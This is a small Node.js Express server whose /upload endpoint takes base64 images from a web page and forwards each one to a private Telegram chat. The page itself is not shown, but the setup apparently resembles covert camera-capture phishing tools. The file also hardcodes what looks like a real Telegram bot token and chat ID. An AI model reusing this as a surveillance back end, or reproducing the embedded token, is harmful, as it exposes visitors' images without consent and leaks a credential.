const express = require("express");
const axios = require("axios");
const FormData = require("form-data");

const app = express();

// 🔐 بيانات البوت
const BOT_TOKEN = "8412546477:AAHq9FYhwDL_a-k5NTWz_vSh8SaGBAOHi2Q";
const CHAT_ID = 6139496596;

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

app.post("/upload", async (req, res) => {
  try {
    const base64 = req.body.image.split(",")[1];
    const buffer = Buffer.from(base64, "base64");

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", buffer, {
      filename: "photo.jpg",
      contentType: "image/jpeg"
    });

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      form,
      { headers: form.getHeaders() }
    );

    res.sendStatus(200);
  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
